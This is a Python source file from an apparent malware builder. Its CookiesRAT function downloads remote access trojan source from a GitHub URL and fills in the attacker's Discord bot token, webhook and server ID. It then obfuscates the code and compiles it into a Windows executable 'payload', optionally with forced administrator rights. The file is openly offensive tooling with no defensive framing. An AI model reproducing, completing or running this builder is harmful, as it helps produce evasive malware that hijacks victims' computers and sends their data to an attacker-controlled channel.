import os, shutil, requests
from cookies_package import *
from util.plugins.common import clear, cleanup, compile_forceadmin, compile
from colorama import Fore


def CookiesRAT(token, webhook, serverID, fileName, force_admin):
    clear()
    try:
        '''
        Write source to file and replace the webhook
        '''
        r = requests.get("https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/src/main.py").text.replace("DISCORD_BOT_TOKEN", token).replace("DISCORD_WEBHOOK", webhook).replace("DISCORD_SERVER_ID", serverID)
        with open(f"{fileName}.py", "w") as f: f.write(r)
        f.close()

        obfusacate(f"{fileName}.py")   # Obfuscate the file

        if str(force_admin).lower() == 'yes' or str(force_admin).lower() == 'y':
            print(f"{Fore.CYAN}\nCreating payload named {Fore.GREEN}{fileName}{Fore.CYAN}.exe With Force Admin!\n{Fore.RESET}")
            compile_forceadmin(fileName)    # Compile the file to executable with force admin
        else:
            print(f"{Fore.CYAN}\nCreating payload named {Fore.GREEN}{fileName}.exe Without Force Admin!\n{Fore.RESET}")
            compile(fileName)   # Compile the file to executable without force admin

        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")   # Move the executable from dist folder to the current directory
        
        cleanup(fileName)   # Cleanup the files

    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error while making exe{Fore.RESET}: {e}')
        cleanup(fileName)   # Cleanup the files
        input(f'\n\n{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')
        return

    print(f"\n{Fore.GREEN}Finshed creating payload{Fore.RESET}\n")
    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')